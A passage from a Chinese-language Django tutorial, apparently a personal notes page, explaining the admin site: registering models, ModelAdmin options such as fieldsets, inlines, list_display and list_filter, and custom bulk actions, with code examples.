{% static %}模板标签会生成静态文件的绝对URL路径,这样就可以任意改变STATIC_URL,而不用同时修改一大堆静态文件中路径相关的部分
{% static %}模板标签在静态文件(例如样式表)中是不可用的,因为它们不是由Django生成的,所以仍需要使用相对路径的方式在静态文件之间互相引用。

重启服务器,浏览器访问http://localhost:8000/polls/查看样式

</pre>
</div>

<div id="django_admin">
<h4>admin后台管理</h4><pre>
为员工或客户生成一个用户添加、修改和删除内容的后台是一项缺乏创造性和乏味的工作,因此Django全自动地根据模型创建后台界面。
Django产生于一个公众页面和内容发布者页面完全分离的新闻类站点的开发过程中,站点管理人员使用管理系统来添加新闻、事件和体育时讯等,这些添加的内容被显示在公众页面上。Django通过为站点管理人员创建统一的内容编辑界面解决了这个问题。

admin通过读取模型数据快速构造出一个可以对实际数据进行管理的Web站点,常用于开发测试,简单管理等场合,适用于部门内部为工作方便的场合,但不建议在生产环境中使用,默认使用startproject时admin就被激活了

在使用admin时请注意下面的需求和要点:
将django.contrib.admin加入INSTALLED_APPS。
依赖四个存在于INSTALLED_APPS的模块:django.contrib.auth、django.contrib.contenttypes、django.contrib.messages和django.contrib.sessions。
在settings文件中的TEMPLATES中的context_processors选项内添加django.contrib.auth.context_processors.auth和django.contrib.messages.context_processors.messages,将django.contrib.auth.middleware.AuthenticationMiddleware和django.contrib.messages.middleware.MessageMiddleware添加到settings的MIDDLEWARE内,默认这些都是配置好的。
决定哪些模型需要在admin内进行管理,在admin.py文件中注册它们。
对于每个模型,可以创建一个对应的ModelAdmin类,这个类将封装对模型的所有自定义设置。
实例化一个AdminSite,将模型、模型对应的ModelAdmin类传给它。
链接AdminSite和URLconf,这一步通常默认已经完成。

创建一个管理员账号
$ python3 manage.py createsuperuser

设置好用户名和密码之后浏览器进入http://127.0.0.1:8000/admin/管理员登录界面有几种可编辑的内容:组和用户,它们是由django.contrib.auth模块提供的身份认证框架

搜索admin文件
在INSTALLED_APPS设置中添加了django.contrib.admin后,Django将自动在每个应用中搜索admin模块并导入它,通常在每个app下都有一个admin.py文件,将当前app和admin有关的内容写到内部的admin.py文件中就可以了,Django会自动搜索并应用它们。
class apps.AdminConfig:admin默认的AppConfig类,当Django启动时自动调用其autodiscover()方法
class apps.SimpleAdminConfig:和上面的类似,但不调用autodiscover()
autodiscover():自动搜索admin模块的方法。在使用自定义的site时必须禁用这个方法,应该在INSTALLED_APPS设置中用django.contrib.admin.apps.SimpleAdminConfig替代django.contrib.admin

如果只是在admin中简单的展示及管理模型,那么在admin.py模块中使用admin.site.register将模型注册一下就好了:
from django.contrib import admin
from myproject.myapp.models import Author
admin.site.register(Author)

向admin管理页面注册投票应用
现在还无法看到投票应用,必须先在admin中进行注册,告诉admin站点将polls的模型加入站点内,接受站点的管理,编辑polls/admin.py

from django.contrib import admin
from .models import Question
admin.site.register(Question)

向管理页面注册了Question类,管理页面会提供对Questions object的增删改查管理
表单是从Question模型中自动生成的,不同的字段类型如日期时间字段DateTimeField、字符字段CharField会生成对应的HTML输入控件
每个日期时间字段DateTimeField都有js写的快捷按钮,日期有转到今天(Today)的快捷按钮和一个弹出式日历界面,时间有设为现在(Now)的快捷按钮和一个列出常用时间的方便的弹出式列表。

页面的底部提供了几个选项:
保存(Save) - 保存改变,然后返回对象列表。
保存并继续编辑(Save and continue editing) - 保存改变,然后重新载入当前对象的修改界面。
保存并新增(Save and add another) - 保存改变,然后添加一个新的空对象并载入修改界面。
删除(Delete) - 显示一个确认删除页面。

【 自定义后台表单 】
对admin进行各种深度定制就要使用Django提供的ModelAdmin类,ModelAdmin类是一个模型在admin页面里的展示方法

通过admin.site.register(Question)在admin站点注册Question模型,Django会自动生成一个该模型的默认表单页面。如果想自定义该页面的外观和工作方式,可以在注册对象的时候指定Django自定义选项

</pre>polls/admin.py修改模型的后台管理选项<textarea>
from django.contrib import admin
from .models import Question

class QuestionAdmin(admin.ModelAdmin):       # 创建一个模型后台管理类,修改admin表单默认排序方式
    fields = ['pub_date', 'question_text']   # 使得"Publication date"字段显示在"Question"字段之前

admin.site.register(Question, QuestionAdmin) # 将模型后台管理类作为第二个参数传给admin.site.register()

# 将表单分为几个字段集,fieldsets元组中的第一个元素是字段集的标题
class QuestionAdmin(admin.ModelAdmin):
    fieldsets = [
        (None,               {'fields': ['question_text']}),
        ('Date information', {'fields': ['pub_date']}),
    ]

admin.site.register(Question, QuestionAdmin)

</textarea><textarea>
from django.contrib import admin
from myproject.myapp.models import Author

# 创建一个ModelAdmin的子类
class AuthorAdmin(admin.ModelAdmin):
    pass

# 注册的时候将原模型和ModelAdmin耦合起来
admin.site.register(Author, AuthorAdmin)

</textarea><pre>
【 注册装饰器 】
除了常用的admin.site.register(Author, AuthorAdmin)方式进行注册,还可以用装饰器的方式连接模型和ModelAdmin

</pre><textarea>
from django.contrib import admin
from .models import Author

@admin.register(Author)
class AuthorAdmin(admin.ModelAdmin):
    pass

# 这个装饰器可以接收一些模型类作为参数,以及一个可选的关键字参数site(如果使用的不是默认的AdminSite)
from django.contrib import admin
from .models import Author, Reader, Editor
from myproject.admin_site import custom_admin_site

@admin.register(Author, Reader, Editor, site=custom_admin_site)
class PersonAdmin(admin.ModelAdmin):
    pass

</textarea><pre>
【 添加关联的对象 】
一个Question有多个Choice,但后台页却没有显示Choices的内容,有两个方法可以解决这个问题
第一个就是像Question一样将Choice注册到admin站点
from .models import Question, Choice
admin.site.register(Choice)
admin.site.register(Question)

现在"Choices"在Django后台页中是一个可用的选项了,在这个表单中Question字段是一个select选择框,包含了当前数据库中所有的Question实例,Django在admin站点中自动地将所有的外键关系展示为一个select框

表单中的添加按钮连接到Question模型。每一个包含外键关系的对象都会有这个绿色加号,点击它会弹出一个新增Question的表单,类似Question自己的添加表单。填入相关信息点击保存后,Django自动将该Question保存在数据库,并作为当前Choice的关联外键对象。白话讲就是,新建一个Question并作为当前Choice的外键

</pre>更好的办法是在创建Question对象时直接添加一些Choice,修改Question的注册代码<textarea>
from django.contrib import admin
from .models import Choice, Question

class ChoiceInline(admin.StackedInline):
    model = Choice
    extra = 3

class QuestionAdmin(admin.ModelAdmin):
    fieldsets = [
        (None,               {'fields': ['question_text']}),
        ('Date information', {'fields': ['pub_date'], 'classes': ['collapse']}),
    ]
    inlines = [ChoiceInline]

admin.site.register(Question, QuestionAdmin)

</textarea><pre>
上面的代码相当于告诉Django,Choice对象将在Question管理页面进行编辑,默认情况提供3个Choice对象的编辑区域

三个关联的选项插槽由extra定义,且每次返回任意已创建的对象的"修改"页面时会见到三个新的插槽
在三个插槽的末端会看到一个"add abuther Choice"的按钮,单击它一个新的插槽会被添加。如果想移除已有的插槽,可以点击插槽右上角的X,但不能移除默认的3个插槽

页面中插槽纵队排列的方式需要占据大块的页面空间来显示所有关联的Choice对象的字段。对于这个问题Django提供了一种表格式的单行显示关联对象的方法。只需要修改一下ChoiceInline继承的类为admin.TabularInline替代先前的StackedInline类,关联对象以一种表格式的方式展示,显得更加紧凑

定制实例的列表页面,改成一个能展示系统中所有投票的页面
默认情况下Django显示每个对象的__str()__方法返回的值,但有时如果能够显示多个字段会更有帮助,为此使用list_display熟悉,它是一个包含要显示的字段名的元组,其中的每一个字段都会按顺序显示在"change list"页面上
在QuestionAdmin类中追加:list_display = ('question_text', 'pub_date', 'was_published_recently')

可以点击每一列的标题来根据这列的内容进行排序,但was_published_recently这一列除外,不支持这种根据函数输出结果进行排序的方式,was_published_recently这一列的列标题默认是方法的名字,内容则是输出的字符串表示形式

</pre>可以通过给这个方法(在polls/models.py中)一些属性来达到优化的目的<textarea>
class Question(models.Model):
    # ...
    def was_published_recently(self):
        now = timezone.now()
        return now - datetime.timedelta(days=1) <= self.pub_date <= now
    was_published_recently.admin_order_field = 'pub_date'
    was_published_recently.boolean = True
    was_published_recently.short_description = 'Published recently?'

</textarea><pre>
过滤器,使用list_filter属性对显示结果进行过滤
list_filter = ['pub_date']
在页面右边多出了一个基于pub_date的过滤面板,允许以pub_date字段来过滤列表,展示的过滤器类型取决要过滤的字段的类型,因为pub_date是类DateTimeField,因此Django自动添加了这些选项:"Any date", "Today", "Past 7 days", "This month", "This year"

search_fields = ['question_text']
在列表的顶部增加一个搜索框,输入搜索关键字时Django将搜索question_text字段,可以使用任意多的字段,Django在后台使用的都是SQL查询语句的LIKE语法,但是有限制的搜索字段有助于后台的数据库查询效率

这个页面还提供分页功能,默认每页显示100条

【 ModelAdmin的属性 】
真正用来定制admin的手段大部分都集中在这些ModelAdmin内置的属性上。
ModelAdmin非常灵活,它有许多内置属性,帮助自定义admin的界面和功能,所有的属性都定义在ModelAdmin的子类中

from django.contrib import admin
class AuthorAdmin(admin.ModelAdmin):
    date_hierarchy = 'pub_date'

1. ModelAdmin.actions
一个包含自定义的actions的列表


自定义Admin actions
通常情况下admin的工作模式是"选中目标,然后修改目标",但在同时修改大量目标的时候,这种模式就变得重复、繁琐。
为此admin提供了自定义功能函数actions的手段,可以批量对数据进行修改。
admin页面通过模型对象列表前的多选按钮对选中的模型对象执行批量操作,批量操作的方法即action,admin内置了一个批量删除对象的操作'删除所选的modle对象'

</pre>下面以一个新闻应用的文章模型为例,介绍一个批量更新的自定义actions,它将选择的文章由"草稿"状态更新为"发布"状态:<textarea>
### 模型的代码
from django.db import models

STATUS_CHOICES = (
    ('d', 'Draft'),
    ('p', 'Published'),
    ('w', 'Withdrawn'),
)

class Article(models.Model):
    title = models.CharField(max_length=100)
    body = models.TextField()
    status = models.CharField(max_length=1, choices=STATUS_CHOICES)

    def __str__(self):  # __unicode__ on Python 2
        return self.title

### 编写action
action必须携带三个参数:当前的ModelAdmin、当前的HttpRequest对象即request、被选择的对象即QuerySet,在应用中的admin.py文件中写入:
def make_published(modeladmin, request, queryset): queryset.update(status='p')

例子简单地使用了queryset自带的update()方法,它能批量操作,但多数情况下要自己遍历queryset的每个元素,并编写具体的操作:
for obj in queryset: do_something_with(obj)

还可以设置一个简单易懂的简短描述(可以使用中文),用于代替生硬的函数名:
def make_published(modeladmin, request, queryset): queryset.update(status='p')
make_published.short_description = "Mark selected stories as published"

### 将自定义action添加到对应的ModelAdmin中
from django.contrib import admin
from myapp.models import Article

def make_published(modeladmin, request, queryset):
    queryset.update(status='p')
make_published.short_description = "Mark selected stories as published"

class ArticleAdmin(admin.ModelAdmin):
    list_display = ['title', 'status']
    ordering = ['title']
    actions = [make_published]  # 将自定义action添加到对应的ModelAdmin中

admin.site.register(Article, ArticleAdmin)

处理错误:
如果能够预知在自定义的操作中可能产生的错误,请处理该错误,并通过django.contrib.admin.ModelAdmin.message_user()以友好的方式给予用户提示信息。

### 将action定义为ModelAdmin的方法,上面的make_published看起来已经不错了,但一般会将它作为ModelAdmin的方法来使用
class ArticleAdmin(admin.ModelAdmin):
    actions = ['make_published']  # 请注意这里改成字符串引用了

    def make_published(self, request, queryset):
        queryset.update(status='p')
    make_published.short_description = "Mark selected stories as published"

# 这样做的好处是自定义方法可以直接访问类本身。例如下面使用self引用,为方法添加提示信息的功能:
class ArticleAdmin(admin.ModelAdmin):
    def make_published(self, request, queryset):
        rows_updated = queryset.update(status='p')
        if rows_updated == 1:
            message_bit = "1 story was"
        else:
            message_bit = "%s stories were" % rows_updated
        self.message_user(request, "%s successfully marked as published." % message_bit)

### 跳转到中间页面
默认执行完actions后浏览器会返回先前的修改列表页面,但一些复杂的action要返回中间页面,如内置的删除方法在执行删除动作之前会弹出一个删除确认页面。
要实现这个功能,只需要在action方法中返回一个HttpResponse或它的子类,例如下面是一个利用Django内置的序列化函数将一个对象保存为json格式的范例:

from django.http import HttpResponse
from django.core import serializers

def export_as_json(modeladmin, request, queryset):
    response = HttpResponse(content_type="application/json")
    serializers.serialize("json", queryset, stream=response)
    return response

# 多数情况下会使用HttpResponseRedirect跳转到一个中间页面,并在GET方法的url中携带被选择的对象作为参数传递过去,然后在这个新的视图中接收这个参数,并编写具体的更加复杂的业务逻辑:

from django.contrib import admin
from django.contrib.contenttypes.models import ContentType
from django.http import HttpResponseRedirect

def export_selected_objects(modeladmin, request, queryset):
    # 获得被打钩的checkbox对应的对象
    selected = request.POST.getlist(admin.ACTION_CHECKBOX_NAME)
    # 获取对应的模型
    ct = ContentType.objects.get_for_model(queryset.model)
    # 构造访问的url,使用GET方法,跳转到相应的页面
    return HttpResponseRedirect("/export/?ct=%s&ids=%s" % (ct.pk, ",".join(selected)))

### 编写可用于整个admin站点的action
前面创建的actions只能应用于绑定的模型。实际上有时候还需要可以对admin站点内所有模型都有效的acitons。上面写的export_selected_objects函数可以是一个很好的例子。要实现这一功能,需要使用内置的AdminSite.add_action方法:AdminSite.add_action(action, name=None)

from django.contrib import admin
admin.site.add_action(export_selected_objects)

### 禁用acitons
有时候对于某些actions,想全局禁用或局部禁用它,需要使用AdminSite.disable_action(name)方法。

禁用全站级别的acitons:
例如禁用内置的删除方法:
admin.site.disable_action('delete_selected')

全站禁用,但个别可用:在ModelAdmin.actions中显式地引用。
例如:全站禁用删除功能
admin.site.disable_action('delete_selected')

# 这个老老实实的被禁了
class SomeModelAdmin(admin.ModelAdmin):
    actions = ['some_other_action']

# 这个声明:我还要用
class AnotherModelAdmin(admin.ModelAdmin):
    actions = ['delete_selected', 'a_third_action']

在指定模型中禁用所有actions:设置ModelAdmin.actions为None。(这会连带全局actions一起禁用了。)
class MyModelAdmin(admin.ModelAdmin):
    actions = None

根据条件自动启用或禁用:
还可以根据条件自动选择性的启动或禁用某些acitons,只需要改写ModelAdmin.get_actions()方法。
该方法将返回一个包含actions的字典。字典的键是aciton的名字(也就是前面的'delete_selected', 'a_third_action'之类),值是一个元组,包含(函数、名字、别名)

例如,允许用户名以"J"开头的用户批量删除对象,但其它用户不行:
class MyModelAdmin(admin.ModelAdmin):
    def get_actions(self, request):
        actions = super(MyModelAdmin, self).get_actions(request)
        if request.user.username[0].upper() != 'J':
            if 'delete_selected' in actions:
                del actions['delete_selected']
        return actions

</textarea><pre>
2. ModelAdmin.actions_on_top
是否在列表上方显示actions的下拉框,默认为True

3. ModelAdmin.actions_on_bottom
是否在列表下方显示actions的下拉框,默认为False

4. ModelAdmin.actions_selection_counter
是否在actions下拉框右侧显示选中的对象的数量,默认为True

5. ModelAdmin.date_hierarchy
根据指定的日期相关的字段为列表页面创建一个时间导航栏,可通过日期过滤对象
date_hierarchy = 'pub_date'

6. ModelAdmin.empty_value_display
指定空白显示的内容。如果有些字段没有值如None、空字符串等,默认情况下会显示破折号"-",这个选项可以自定义显示什么
from django.contrib import admin
class AuthorAdmin(admin.ModelAdmin): empty_value_display = '-empty-'

还可以为整个admin站点设置默认空白显示值,通过设置AdminSite.empty_value_display="xxxxxxx",甚至为某个函数设置空白值

</pre><textarea>
from django.contrib import admin
class AuthorAdmin(admin.ModelAdmin):
    fields = ('name', 'title', 'view_birth_date')
    def view_birth_date(self, obj): return obj.birth_date
    view_birth_date.empty_value_display = '???'

</textarea><pre>
7. ModelAdmin.exclude
不显示指定的某些字段

</pre><textarea>
from django.contrib import admin
class AuthorAdmin(admin.ModelAdmin):
    fields = ('name', 'title') # # Author模型有name、title、birth_date三个字段
    # 等效于
    exclude = ('birth_date',)  # 页面内不显示birth_date字段,值是个元组

</textarea><pre>
8. ModelAdmin.fields
模型对象详情页按指定的顺序显示指定的字段,与exclude相对,但要注意与list_display区分,可以通过组合元组的方式让某些字段在同一行内显示
class FlatPageAdmin(admin.ModelAdmin):
    fields = (('url', 'title'), 'content')  # "url"和"title"将在一行内,而"content"则在下一行

如果没有对field或fieldsets选项进行定义,那么Django将按照模型定义中的顺序,每一行显示一个字段的方式,逐个显示所有的非AutoField和editable=True的字段,自动字段如主键、不可编辑字段是不会出现在页面里的

9. ModelAdmin.fieldsets
这个功能其实就是根据字段对页面进行分组显示或布局了。fieldsets是一个二元元组的列表。每个二元元组代表一个< fieldset>,是整个form的一部分。
二元元组的格式为(name,field_options),name是一个表示该filedset标题的字符串,field_options是一个包含在该filedset内的字段列表。

</pre><textarea>
from django.contrib import admin

class FlatPageAdmin(admin.ModelAdmin):
    fieldsets = (
        (None, {
            'fields': ('url', 'title', 'content', 'sites')
        }),
        ('Advanced options', {         # 有标题,但classes:collapse设置为折叠状态
            'classes': ('collapse',),
            'fields': ('registration_required', 'template_name'),
        }),
    )

</textarea><pre>
在field_options字典内可以使用下面这些关键字:
1) fields:一个必填的元组,包含要在fieldset中显示的字段,如'fields': ('first_name', 'last_name', 'address', 'city', 'state'),
同样,它也可以通过组合元组实现多个字段在一行内的效果:'fields': (('first_name', 'last_name'), 'address', 'city', 'state'),
fileds可以包含readonly_fields的值作为只读字段。
2) classes:一个包含额外的CSS类的元组,如'classes': ('wide', 'extrapretty'),两个比较有用的样式是collaspe和wide,前者将fieldsets折叠起来,后者让它具备更宽的水平空间。
3) description:一个可选的额外的说明文本,放置在每个fieldset的顶部。但这里并没有对description的HTML语法进行转义,因此可能有时候会造成一些莫名其妙的显示,要忽略HTML的影响,请使用django.utils.html.escape()手动转义。

10. ModelAdmin.filter_horizontal
水平扩展多对多字段。默认ManyTOManyField在admin的页面中会显示为一个select框,在需要选择大量对象时这会有点困难。将ManyTOManyField添加到这个属性列表里后,页面就会对字段进行扩展,并提供过滤功能

11. ModelAdmin.filter_vertical
与上面的类似,不过是改成垂直布置了

12. ModelAdmin.form
默认admin系统会为模型动态的创建ModelForm,它用于创建添加/修改页面的表单。可以编写自定义的ModelForm在"添加/修改"页面覆盖默认的表单行为。

</pre>如果ModelForm和ModelAdmin同时定义了exclude选项,那么ModelAdmin中的具有优先权,下例age字段将被排除,但name字段将被显示:<textarea>
from django import forms
from django.contrib import admin
from myapp.models import Person

class PersonForm(forms.ModelForm):
    class Meta:
        model = Person
        exclude = ['name']

class PersonAdmin(admin.ModelAdmin):
    exclude = ['age']
    form = PersonForm

</textarea><pre>
13. ModelAdmin.formfield_overrides
设想写了个RichTextEditorWidget(富文本控件),然后想用它来代替传统的textarea文本域控件用于输入大段文字

</pre><textarea>
from django.db import models
from django.contrib import admin

# 从对应的目录导入先前写好的widget和model
from myapp.widgets import RichTextEditorWidget
from myapp.models import MyModel

class MyModelAdmin(admin.ModelAdmin):
    formfield_overrides = {
        models.TextField: {'widget': RichTextEditorWidget},
    }

</textarea><pre>
14. ModelAdmin.inlines
参考InlineModelAdmin对象,就像ModelAdmin.get_formsets_with_inlines()一样。

15. ModelAdmin.list_display
指定显示在列表页面上的字段,这是一个很常用也是最重要的技巧之一,例如:list_display = ('first_name', 'last_name')
如果不设置这个属性,admin站点将只显示一列,内容是每个对象的__str__()或Python2使用__unicode__()方法返回的内容。

在list_display中可以设置四种值:
1.模型的字段名
class PersonAdmin(admin.ModelAdmin): list_display = ('first_name', 'last_name')

2.一个函数,它接收一个模型实例作为参数
def upper_case_name(obj): return ("%s %s" % (obj.first_name, obj.last_name)).upper()
upper_case_name.short_description = 'Name'
class PersonAdmin(admin.ModelAdmin): list_display = (upper_case_name,)

3.一个表示ModelAdmin的某个属性的字符串
类似上面的函数调用,通过反射获取函数名,换了种写法而已

</pre><textarea>
class PersonAdmin(admin.ModelAdmin):
    list_display = ('upper_case_name',)

    def upper_case_name(self, obj):
        return ("%s %s" % (obj.first_name, obj.last_name)).upper()
    upper_case_name.short_description = 'Name'

</textarea><pre>
4.一个表示模型的某个属性的字符串
类似第二种,但是此处的self是模型实例,引用的是模型的属性

</pre><textarea>
from django.db import models
from django.contrib import admin

class Person(models.Model):
    name = models.CharField(max_length=50)
    birthday = models.DateField()

    def decade_born_in(self):
        return self.birthday.strftime('%Y')[:3] + "0's"
    decade_born_in.short_description = 'Birth decade'

class PersonAdmin(admin.ModelAdmin):
    list_display = ('name', 'decade_born_in')

</textarea><pre>
对于Foreignkey字段,list_display显示的将是其__str__()方法的值。
不支持ManyToMany字段,如果非要显示它请自定义方法。
对于BooleanField或NullBooleanField字段会用on/off图标代替True/False。
如果给list_display提供的值是一个模型的、ModelAdmin的或可调用的方法,默认会自动对返回结果进行HTML转义,这可能不是想要的。

</pre><textarea>
from django.db import models
from django.contrib import admin
from django.utils.html import format_html

class Person(models.Model):
    first_name = models.CharField(max_length=50)
    last_name = models.CharField(max_length=50)
    color_code = models.CharField(max_length=6)

    def colored_name(self):
        return '< span style="color: #%s;">%s %s< /span>'%(self.color_code, self.first_name, self.last_name)
        # 想要有个CSS效果,但Django把它当普通的字符串了。怎么办呢？用format_html()或者format_html_join()或者mark_safe()方法
        # 调用方式'%'变成'{}'
        return format_html('< span style="color: #{};">{} {}< /span>', self.color_code, self.first_name, self.last_name)

class PersonAdmin(admin.ModelAdmin):
    list_display = ('first_name', 'last_name', 'colored_name')

</textarea><pre>
如果某个字段的值为None或空字符串或空的可迭代对象,那么默认显示为短横杠"-",可以使用AdminSite.empty_value_display在全局改写这一行为:
from django.contrib import admin
admin.site.empty_value_display = '(None)'

或使用ModelAdmin.empty_value_display只改变某个类的行为:
class PersonAdmin(admin.ModelAdmin): empty_value_display = 'unknown'

或更细粒度的只改变某个字段的这一行为:
class PersonAdmin(admin.ModelAdmin):
    list_display = ('name', 'birth_date_view')
    def birth_date_view(self, obj): return obj.birth_date
    birth_date_view.empty_value_display = 'unknown'

默认一个返回布尔值的方法在list_display中显示为True或False,但如果给这个方法添加一个boolean的属性并赋值为True,它将显示为on/off的图标

通常在list_display列表里的元素如果不是数据库内的某个具体字段,是不能根据它进行排序的。但如果给这个字段添加一个admin_order_field属性,并赋值一个具体的数据库内的字段,则可以按这个字段对原字段进行排序

</pre><textarea>
from django.db import models
from django.contrib import admin
from django.utils.html import format_html

class Person(models.Model):
    first_name = models.CharField(max_length=50)
    color_code = models.CharField(max_length=6)
    birthday = models.DateField()

    def born_in_fifties(self):
        return self.birthday.strftime('%Y')[:3] == '195'
    born_in_fifties.boolean = True  # born_in_fifties显示为on/off的图标

    def colored_first_name(self):
        return format_html('< span style="color: #{};">{}< /span>', self.color_code, self.first_name)

    # colored_first_name是不能排序的,给它的admin_order_field赋值first_name后就依据first_name进行排序了
    colored_first_name.admin_order_field = 'first_name'
    colored_first_name.admin_order_field = '-first_name'         # 使用连字符"-"前缀表示降序
    colored_first_name.short_description = 'colored first name?' # 显示的文字说明

class PersonAdmin(admin.ModelAdmin):
    list_display = ('first_name', 'colored_first_name')

</textarea>跨表跨关系引用<textarea>
class Blog(models.Model):
    title = models.CharField(max_length=255)
    author = models.ForeignKey(Person, on_delete=models.CASCADE)

class BlogAdmin(admin.ModelAdmin):
    list_display = ('title', 'author', 'author_first_name')

    def author_first_name(self, obj):
        return obj.author.first_name
    # 指定了另一张表的first_name作为排序的依据
    author_first_name.admin_order_field = 'author__first_name'

</textarea><pre>
list_display里的元素还可以是某个属性,但如果使用python的@property方式来构造一个属性则不能给它添加short_description描述,只有使用property()函数的方法构造属性的时候才可以添加short_description描述

</pre><textarea>
class Person(models.Model):
    first_name = models.CharField(max_length=50)
    last_name = models.CharField(max_length=50)

    def my_property(self):
        return self.first_name + ' ' + self.last_name
    my_property.short_description = "Full name of the person"

    full_name = property(my_property)

class PersonAdmin(admin.ModelAdmin):
    list_display = ('full_name',)

</textarea><pre>
list_display中的每个字段名在HTML中都将自动生成CSS类属性,在th标签中以column-< field_name>的格式,可以通过它对前端进行自定义或调整,例如设置宽度等

Django将按下面的顺序,解释list_display中的每个元素:
模型的字段
可调用对象
ModelAdmin的属性
模型的属性

16. ModelAdmin.list_display_links
指定用于链接修改页面的字段。通常list_display列表中的第一个元素被作为指向目标修改页面的超级链接点,使用list_display_links可以修改这一默认配置。

设置为None则根本没有链接了,无法跳到目标的修改页面。
设置为一个字段的元组或列表,和list_display的格式一样,这里面的每一个元素都是一个指向修改页面的链接。可以指定和list_display一样多的元素个数,如果要使用list_display_links必须先有list_display。

</pre><textarea>
# 下面这个例子中first_name和last_name都可以点击并跳转到修改页面。
class PersonAdmin(admin.ModelAdmin):
    list_display = ('first_name', 'last_name', 'birthday')
    list_display_links = ('first_name', 'last_name')
    list_display_links = None  # 这样将没有任何链接

</textarea><pre>
17. ModelAdmin.list_editable
这个选项是指定在修改列表页面中哪些字段可以被编辑。指定的字段将显示为编辑框,可修改后直接批量保存
一是不能将list_display中没有的元素设置为list_editable,二是不能将list_display_links中的元素设置为list_editable。原因很简单,不能编辑没显示的字段或者作为超级链接的字段

18. ModelAdmin.list_filter
设置list_filter属性可以激活修改列表页面的右侧边栏,用于对列表元素进行过滤

list_filter必须是一个元组或列表,其元素是如下类型之一:
(1)某个字段名,但该字段必须是BooleanField、CharField、DateField、DateTimeField、IntegerField、ForeignKey或ManyToManyField
class PersonAdmin(admin.ModelAdmin):
    list_filter = ('is_staff', 'company')
    list_filter = ('company__name',) # 可以利用双下划线进行跨表关联

(2)一个继承django.contrib.admin.SimpleListFilter的类,要给这个类提供title和parameter_name的值,并重写lookups和queryset方法

</pre><textarea>
from datetime import date
from django.contrib import admin
from django.utils.translation import ugettext_lazy as _

class DecadeBornListFilter(admin.SimpleListFilter):
    title = _('出生年代')       # 提供一个可读的标题
    parameter_name = 'decade'  # 用于URL查询的参数

    def lookups(self, request, model_admin):
        # 返回一个二维元组,每个元组的第一个元素是用于URL查询的真实值,这个值会被self.value()方法获取,并作为queryset方法的选择条件。第二个元素则是可读的显示在admin页面右边侧栏的过滤选项。
        return (('80s', _('80年代')), ('90s', _('90年代')))

    def queryset(self, request, queryset):
        # 根据self.value()方法获取的条件值的不同执行具体的查询操作,并返回相应的结果
        if self.value() == '80s':
            return queryset.filter(birthday__gte=date(1980, 1, 1), birthday__lte=date(1989, 12, 31))
        if self.value() == '90s':
            return queryset.filter(birthday__gte=date(1990, 1, 1),birthday__lte=date(1999, 12, 31))

class PersonAdmin(admin.ModelAdmin):
    list_display = ('first_name', 'last_name', "colored_first_name",'birthday')
    list_filter = (DecadeBornListFilter,)

# 为了方便通常会将HttpRequest对象传递给lookups和queryset方法
class AuthDecadeBornListFilter(DecadeBornListFilter):
    def lookups(self, request, model_admin):
        if request.user.is_superuser:
            return super().lookups(request, model_admin)

    def queryset(self, request, queryset):
        if request.user.is_superuser:
            return super().queryset(request, queryset)

# 同样的,默认将ModelAdmin对象传递给lookups方法。下面的例子根据查询结果调整过滤选项,如果某个年代没有符合的对象则这个选项不会在右边的过滤栏中显示:
class AdvancedDecadeBornListFilter(DecadeBornListFilter):
    def lookups(self, request, model_admin):
        # 只有存在确切的对象,并且它出生在对应年代时,才会出现这个过滤选项。
        qs = model_admin.get_queryset(request)
        if qs.filter(birthday__gte=date(1980, 1, 1), birthday__lte=date(1989, 12, 31)).exists():
            yield ('80s', _('in the eighties'))
        if qs.filter(birthday__gte=date(1990, 1, 1), birthday__lte=date(1999, 12, 31)).exists():
            yield ('90s', _('in the nineties'))

# 也可以是一个元组。它的第一个元素是个字段名,第二个元素则是继承了django.contrib.admin.FieldListFilter的类
class PersonAdmin(admin.ModelAdmin):
    list_filter = (('is_staff', admin.BooleanFieldListFilter),)

# 可以使用RelatedOnlyFieldListFilter限制关联的对象。假设author是关联User模型的ForeignKey,下面的用法将只选择那些出过书的user而不是所有的user:
class BookAdmin(admin.ModelAdmin):
    list_filter = (('author', admin.RelatedOnlyFieldListFilter),)

# 另外其template属性可以指定渲染的模板,如下则指定了一个自定义的模板。(Django默认的模板为admin/filter.html)
class FilterWithCustomTemplate(admin.SimpleListFilter):
    template = "custom_template.html"

</textarea><pre>
19. ModelAdmin.list_max_show_all
设置一个数值,默认为200,当列表元素总数小于这个值的时候将显示一个"show all"链接,点击后就能看到一个展示了所有元素的页面

20. ModelAdmin.list_per_page
设置每页显示多少个元素,Django自动分页,默认100

21. ModelAdmin.list_select_related
如果设置了list_select_related属性,Django将会使用select_related()方法查询数据,这可能会帮助减少一些数据库访问。
属性的值可以是布尔值、元组或列表,默认False。当值为True时将始终调用select_related()方法;如果值为False则Django将查看list_display属性,只对ForeignKey字段调用select_related()方法。
如果需要更细粒度的控制,请赋值一个元组或列表。空元组将阻止select_related()方法,否则元组会被当做参数传递给select_related()方法。例如:
class ArticleAdmin(admin.ModelAdmin): list_select_related = ('author', 'category')
这将会调用select_related('author', 'category')。

22. ModelAdmin.ordering
设置排序的方式。属性的值必须为一个元组或列表,格式和模型的ordering参数一样。如果不设置这个属性,Django将按默认方式进行排序。如果想进行动态排序,请自己实现get_ordering()方法。

23. ModelAdmin.paginator
指定用于分页的分页器。默认分页器用的是Django自带的django.core.paginator.Paginator。如果自定义分页器的构造函数接口和django.core.paginator.Paginator的不一样,那还需要自己实现ModelAdmin.get_paginator()方法。

24. ModelAdmin.prepopulated_fields
设置预填充字段,不接收DateTimeField、ForeignKey和ManyToManyField类型的字段。
class ArticleAdmin(admin.ModelAdmin): prepopulated_fields = {"slug": ("title",)}

25. ModelAdmin.preserve_filters
默认当对目标进行创建、编辑或删除操作后,页面会依然保持原来的过滤状态。将preserve_filters设为False后则会返回未过滤状态。

26. ModelAdmin.radio_fields
默认Django使用select标签显示ForeignKey或choices集合。如果将这种字段设置为radio_fields则会以radio_box标签的形式展示。下例假设group是Person模型的ForeignKey字段:
class PersonAdmin(admin.ModelAdmin): radio_fields = {"group": admin.VERTICAL}  # 垂直布局,肯定也有水平布局HORIZONTAL的
不要将ForeignKey或choices集合之外的字段类型设置给这个属性

27. ModelAdmin.raw_id_fields
这个属性会改变默认的ForeignKey和ManyToManyField的展示方式,它会变成一个输入框,用于输入关联对象的主键id。对于ManyToManyField,id以逗号分隔。并且再输入框右侧提供一个放大镜的图标,可以点击进入选择界面
class PersonAdmin(admin.ModelAdmin): raw_id_fields = ("group",)

28. ModelAdmin.readonly_fields
该属性包含的字段在页面内将展示为不可编辑状态。它还可以展示模型或ModelAdmin本身的方法的返回值,类似ModelAdmin.list_display的行为

</pre><textarea>
from django.contrib import admin
from django.utils.html import format_html_join
